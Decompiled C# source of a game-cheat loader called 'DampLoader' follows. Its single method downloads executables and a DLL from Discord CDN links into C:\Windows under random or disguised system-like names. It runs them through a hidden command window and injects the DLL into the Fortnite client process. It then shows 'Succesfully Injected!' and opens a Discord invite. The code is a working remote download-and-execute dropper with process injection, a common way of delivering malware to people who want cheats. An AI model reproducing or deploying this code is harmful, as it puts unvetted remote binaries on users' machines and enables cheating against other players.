using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace DampLoader
{
	// Token: 0x02000007 RID: 7
	internal class Cheat
	{
		// Token: 0x0600000D RID: 13 RVA: 0x00002170 File Offset: 0x00000370
		public static void Load()
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\kiagjfitrbqubgraijfnajgshgoiabgiahngflkabgvbfihnf.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734105822975623278/ALTapexDRV.exe", fileName);
			Process.Start(fileName);
			Thread.Sleep(1000);
			MessageBox.Show("Click OK only if you finished to load drivers");
			string fileName2 = "C:\\Windows\\WindowsConfigEditor.exe";
			string fileName3 = "C:\\Windows\\WindowsConfigEditorFile.dll";
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734098098485198960/modmap.exe", fileName2);
			webClient2.DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734144873095233637/SpeedFN.dll", fileName3);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.Start();
			process.StandardInput.WriteLine("cd C:\\Windows");
			process.StandardInput.WriteLine("WindowsConfigEditor FortniteClient-Win64-Shipping.exe dxgi.dll WindowsConfigEditorFile.dll");
			MessageBox.Show("Succesfully Injected!");
			Process.Start("https://discord.gg/rhhr6Et");
		}
	}
}
